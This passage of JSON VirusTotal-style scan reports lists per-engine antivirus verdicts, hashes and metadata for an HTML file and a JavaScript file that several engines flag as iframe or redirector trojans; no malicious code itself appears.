        "Cybereason": {
          "category": "type-unsupported",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230927"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231007"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20220812"
        }
      }
    },
    "type": "file",
    "id": "7d48e8b2ea00c6b698acd4daf2ca1ac407bf295525f303a29f1518a4da27a6cc",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/7d48e8b2ea00c6b698acd4daf2ca1ac407bf295525f303a29f1518a4da27a6cc"
    }
  }
},
{
  "_id": {
    "$oid": "65b4fc65ff7f10aec9ee2701"
  },
  "data": {
    "attributes": {
      "type_description": "HTML",
      "type_tags": [
        "internet",
        "html"
      ],
      "names": [
        "7870ef8615d346fa55ace1d827d35da1",
        "aa",
        "vZl7oPtz5.tar.gz",
        "Z9DVLudYMe.rar"
      ],
      "last_modification_date": 1706305029,
      "type_tag": "html",
      "times_submitted": 1,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 23512,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.crypted",
        "popular_threat_category": [
          {
            "count": 2,
            "value": "trojan"
          }
        ],
        "popular_threat_name": [
          {
            "count": 2,
            "value": "crypted"
          }
        ]
      },
      "last_submission_date": 1305938044,
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "1.3.0.8876",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "AegisLab",
          "engine_version": "4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "12.0.250.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "nProtect": {
          "category": "undetected",
          "engine_name": "nProtect",
          "engine_version": "2017-03-16.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "1.1.0.977",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "14.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "1.0.1.9",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "2.1.1.1115",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "56686",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "TheHacker": {
          "category": "undetected",
          "engine_name": "TheHacker",
          "engine_version": "6.8.0.5.1368",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170315"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170228"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "10.6.22734",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "10.6.22732",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "1.0.0.802",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Invincea": {
          "category": "type-unsupported",
          "engine_name": "Invincea",
          "engine_version": "6.2.2.24419",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170203"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "F-Prot": {
          "category": "malicious",
          "engine_name": "F-Prot",
          "engine_version": "4.7.1.166",
          "result": "JS/Crypted.Q.gen",
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Symantec": {
          "category": "undetected",
          "engine_name": "Symantec",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170315"
        },
        "ESET-NOD32": {
          "category": "undetected",
          "engine_name": "ESET-NOD32",
          "engine_version": "15097",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "9.900.0.1004",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "8.0.1489.320",
          "result": "JS:Iframe-BD [Trj]",
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "0.99.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Kaspersky": {
          "category": "undetected",
          "engine_name": "Kaspersky",
          "engine_version": "15.0.1.13",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "NANO-Antivirus": {
          "category": "malicious",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.70.15657",
          "result": "Trojan.Script.Click.bjvff",
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "28.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Ad-Aware": {
          "category": "undetected",
          "engine_name": "Ad-Aware",
          "engine_version": "3.0.3.794",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "4.0.0.834",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Comodo": {
          "category": "undetected",
          "engine_name": "Comodo",
          "engine_version": "26765",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "11.0.19100.45",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.28.2020",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.3232",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170314"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "9.740.0.1012",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "McAfee-GW-Edition": {
          "category": "malicious",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2015",
          "result": "BehavesLike.HTML.Redirector.mq",
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "4.98.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Cyren": {
          "category": "malicious",
          "engine_name": "Cyren",
          "engine_version": "5.4.30.7",
          "result": "JS/Crypted.Q.gen",
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Webroot": {
          "category": "undetected",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.207",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Avira": {
          "category": "malicious",
          "engine_name": "Avira",
          "engine_version": "8.3.3.4",
          "result": "JS/iFrame.bdka",
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Kingsoft": {
          "category": "undetected",
          "engine_name": "Kingsoft",
          "engine_version": "2013.8.14.323",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Endgame": {
          "category": "type-unsupported",
          "engine_name": "Endgame",
          "engine_version": "0.1.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170222"
        },
        "Microsoft": {
          "category": "undetected",
          "engine_name": "Microsoft",
          "engine_version": "1.1.13504.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "AhnLab-V3": {
          "category": "malicious",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.8.3.16811",
          "result": "HTML/Redirect",
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "ZoneAlarm": {
          "category": "undetected",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "GData": {
          "category": "malicious",
          "engine_name": "GData",
          "engine_version": "A:25.11207B:25.9095",
          "result": "Script.Trojan.Agent.GWTNQ6",
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170315"
        },
        "TotalDefense": {
          "category": "undetected",
          "engine_name": "TotalDefense",
          "engine_version": "37.1.62.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "AVware": {
          "category": "undetected",
          "engine_name": "AVware",
          "engine_version": "1.5.0.42",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "3.12.26.4",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "WhiteArmor": {
          "category": "type-unsupported",
          "engine_name": "WhiteArmor",
          "engine_version": "9101273",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170315"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Yandex": {
          "category": "malicious",
          "engine_name": "Yandex",
          "engine_version": "5.5.1.3",
          "result": "JS.Iframe.Gen.28",
          "method": "blacklist",
          "engine_update": "20170315"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "0.1.5.2",
          "result": "JS.Iframe",
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Fortinet": {
          "category": "undetected",
          "engine_name": "Fortinet",
          "engine_version": "5.4.233.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "16.0.0.4756",
          "result": "JS/Redir",
          "method": "blacklist",
          "engine_update": "20170316"
        },
        "Panda": {
          "category": "undetected",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170315"
        },
        "CrowdStrike": {
          "category": "type-unsupported",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20170130"
        },
        "Qihoo-360": {
          "category": "malicious",
          "engine_name": "Qihoo-360",
          "engine_version": "1.0.0.1120",
          "result": "Script/Virus.0c6",
          "method": "blacklist",
          "engine_update": "20170316"
        }
      },
      "sha256": "e3bc6dc6b71eab98b6f82d6a4c772e98bd44bdd4e08eea9fcd18dcc446cdc497",
      "type_extension": "html",
      "tags": [
        "html"
      ],
      "last_analysis_date": 1489673632,
      "unique_sources": 1,
      "first_submission_date": 1305938044,
      "ssdeep": "384:FEGuRDDeyhbCMNCDW2H2sCVpz9eJnl+sSZ19Xur6Gz0JJRpS4issKgRh3Nk7yYw2:FzuLuyCDWK23K03j9GzsZHYohyOskeWT",
      "md5": "7870ef8615d346fa55ace1d827d35da1",
      "sha1": "0fa2f94ff9c46a50b71c5a022a62959d9424254a",
      "magic": "ASCII HTML document text, with very long lines, with CRLF, LF line terminators",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 8,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 0,
        "failure": 0,
        "malicious": 12,
        "undetected": 45
      },
      "meaningful_name": "7870ef8615d346fa55ace1d827d35da1",
      "reputation": -7
    },
    "type": "file",
    "id": "e3bc6dc6b71eab98b6f82d6a4c772e98bd44bdd4e08eea9fcd18dcc446cdc497",
    "links": {
      "self": "https://www.virustotal.com/api/v3/files/e3bc6dc6b71eab98b6f82d6a4c772e98bd44bdd4e08eea9fcd18dcc446cdc497"
    }
  }
},
{
  "_id": {
    "$oid": "65b4fc7bff7f10aec9ee270b"
  },
  "data": {
    "attributes": {
      "type_description": "JavaScript",
      "tlsh": "T1D8C1830A1DA7CC8B8B21517DE4B2BF6D88568193E3028EA0F0BA4F177A41FC5CC46C5E",
      "vhash": "a7f942f015a7c28212e8b62f978107eb",
      "type_tags": [
        "source",
        "javascript",
        "js"
      ],
      "names": [
        "VirusShare_7863649b1e7263107c7ed7bd4182dce2"
      ],
      "last_modification_date": 1706303797,
      "type_tag": "javascript",
      "times_submitted": 2,
      "total_votes": {
        "harmless": 0,
        "malicious": 1
      },
      "size": 5962,
      "popular_threat_classification": {
        "suggested_threat_label": "trojan.",
        "popular_threat_category": [
          {
            "count": 8,
            "value": "trojan"
          }
        ]
      },
      "html_info": {
        "html_meta": {
          "google-site-verification": [
            "xdRne5YZQo3joMIszqVy-nPit5-vmP1YPAMnbr7eVmA"
          ]
        },
        "hrefs": [
          "/css/structure.css",
          "/css/main.css",
          "recipe.asp?name=    &id=1079&lang=ru",
          "recipe.asp?name=      &id=144&lang=ru",
          "recipe.asp?name= &id=79&lang=ru",
          "recipe.asp?name=  &id=873&lang=ru",
          "recipe.asp?name=     &id=1259&lang=ru",
          "http://www.russiantable.com/store/affiliate/b.asp?id=4500",
          "javascript: window.external.AddFavorite(location.href, document.title);",
          "javascript:window.print();",
          "mailto:info@kushaem.com",
          "recipelist.asp?cat=",
          "http://www.kushaem.com"
        ],
        "scripts": [
          {
            "attributes": {
              "src": "/js/common.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "src": "/js/comments.js",
              "type": "text/javascript"
            }
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "9a8e9fa6653abbb75035e6fa2af3a20a0500a21b702b7b2ba4581b3c7fc23ac0"
          },
          {
            "attributes": {
              "src": "http://pagead2.googlesyndication.com/pagead/show_ads.js",
              "type": "text/javascript"
            },
            "sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "84ce9baf84128422fd7745394213c8af0880db12c909db322beb7e723055b082"
          },
          {
            "attributes": {
              "type": "text/javascript"
            },
            "sha256": "a948411cebc2715a38f6ed1f4c014c71db73de5654a65d7ac8141365ac29cfe0"
          }
        ],
        "title": "* : kushaem.com"
      },
      "javascript_info": {
        "tags": [
          "write+unescape",
          "malformed"
        ]
      },
      "last_submission_date": 1696582985,
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Lionic": {
          "category": "malicious",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": "Trojan.JS.Redirector.4!c",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "tehtris": {
          "category": "type-unsupported",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ClamAV": {
          "category": "undetected",
          "engine_name": "ClamAV",
          "engine_version": "1.2.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230822"
        },
        "CAT-QuickHeal": {
          "category": "malicious",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": "JS.Redirector.DW",
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.4968",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "Sangfor": {
          "category": "undetected",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230926"
        },
        "K7AntiVirus": {
          "category": "undetected",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.118.49792",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Alibaba": {
          "category": "type-unsupported",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190527"
        },
        "K7GW": {
          "category": "undetected",
          "engine_name": "K7GW",
          "engine_version": "12.118.49792",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Trustlook": {
          "category": "type-unsupported",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "BitDefenderTheta": {
          "category": "undetected",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230928"
        },
        "VirIT": {
          "category": "undetected",
          "engine_name": "VirIT",
          "engine_version": "9.5.551",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "Cyren": {
          "category": "undetected",
          "engine_name": "Cyren",
          "engine_version": "6.5.1.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "SymantecMobileInsight": {
          "category": "type-unsupported",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230119"
        },
        "Symantec": {
          "category": "malicious",
          "engine_name": "Symantec",
          "engine_version": "1.20.0.0",
          "result": "Trojan.Gen.NPE",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Elastic": {
          "category": "type-unsupported",
          "engine_name": "Elastic",
          "engine_version": "4.0.111",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231002"
        },
        "ESET-NOD32": {
          "category": "undetected",
          "engine_name": "ESET-NOD32",
          "engine_version": "28026",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "APEX": {
          "category": "type-unsupported",
          "engine_name": "APEX",
          "engine_version": "6.461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "TrendMicro-HouseCall": {
          "category": "undetected",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avast": {
          "category": "malicious",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "result": "JS:Redirector-CAG [Trj]",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Cynet": {
          "category": "undetected",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Kaspersky": {
          "category": "malicious",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "result": "Trojan.JS.Redirector.afa",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "BitDefender": {
          "category": "undetected",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "NANO-Antivirus": {
          "category": "undetected",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "ViRobot": {
          "category": "undetected",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Rising": {
          "category": "undetected",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "TACHYON": {
          "category": "undetected",
          "engine_name": "TACHYON",
          "engine_version": "2023-10-06.02",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Sophos": {
          "category": "undetected",
          "engine_name": "Sophos",
          "engine_version": "2.3.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "Baidu": {
          "category": "undetected",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "result": null,
          "method": "blacklist",
          "engine_update": "20190318"
        },
        "F-Secure": {
          "category": "undetected",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1137.128",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "VIPRE": {
          "category": "undetected",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "TrendMicro": {
          "category": "undetected",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "McAfee-GW-Edition": {
          "category": "undetected",
          "engine_name": "McAfee-GW-Edition",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "SentinelOne": {
          "category": "type-unsupported",
          "engine_name": "SentinelOne",
          "engine_version": "23.3.0.3",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230705"
        },
        "Trapmine": {
          "category": "type-unsupported",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.91",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230907"
        },
        "FireEye": {
          "category": "undetected",
          "engine_name": "FireEye",
          "engine_version": "35.24.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Emsisoft": {
          "category": "undetected",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Paloalto": {
          "category": "type-unsupported",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avast-Mobile": {
          "category": "type-unsupported",
          "engine_name": "Avast-Mobile",
          "engine_version": "231006-00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Jiangmin": {
          "category": "undetected",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "Webroot": {
          "category": "type-unsupported",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Avira": {
          "category": "undetected",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Antiy-AVL": {
          "category": "undetected",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Kingsoft": {
          "category": "malicious",
          "engine_name": "Kingsoft",
          "engine_version": "2023.8.30.1",
          "result": "Win32.Scriptc.Undef.a",
          "method": "blacklist",
          "engine_update": "20230906"
        },
        "Microsoft": {
          "category": "malicious",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23090.2007",
          "result": "Trojan:Script/Wacatac.B!ml",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Gridinsoft": {
          "category": "undetected",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.142.174",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Xcitium": {
          "category": "malicious",
          "engine_name": "Xcitium",
          "engine_version": "36060",
          "result": "TrojWare.JS.Redirector.AR@7o1yog",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Arcabit": {
          "category": "undetected",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "SUPERAntiSpyware": {
          "category": "undetected",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "ZoneAlarm": {
          "category": "malicious",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "result": "Trojan.JS.Redirector.afa",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "GData": {
          "category": "undetected",
          "engine_name": "GData",
          "engine_version": "A:25.36612B:27.33398",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Google": {
          "category": "malicious",
          "engine_name": "Google",
          "engine_version": "1696579227",
          "result": "Detected",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "BitDefenderFalx": {
          "category": "type-unsupported",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230921"
        },
        "AhnLab-V3": {
          "category": "undetected",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.24.0.10447",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Acronis": {
          "category": "undetected",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "result": null,
          "method": "blacklist",
          "engine_update": "20230828"
        },
        "VBA32": {
          "category": "undetected",
          "engine_name": "VBA32",
          "engine_version": "5.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "ALYac": {
          "category": "undetected",
          "engine_name": "ALYac",
          "engine_version": "1.1.3.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "MAX": {
          "category": "undetected",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "DeepInstinct": {
          "category": "type-unsupported",
          "engine_name": "DeepInstinct",
          "engine_version": "3.1.0.15",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "Cylance": {
          "category": "type-unsupported",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231004"
        },
        "Zoner": {
          "category": "undetected",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Tencent": {
          "category": "undetected",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Yandex": {
          "category": "undetected",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "result": null,
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Ikarus": {
          "category": "malicious",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "result": "Trojan.Script.GenericZ",
          "method": "blacklist",
          "engine_update": "20231005"
        },
        "MaxSecure": {
          "category": "malicious",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "result": "Trojan.Malware.121218.susgen",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "Fortinet": {
          "category": "malicious",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "result": "HTML/Redirector.67A5!tr",
          "method": "blacklist",
          "engine_update": "20231006"
        },
        "AVG": {
          "category": "malicious",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
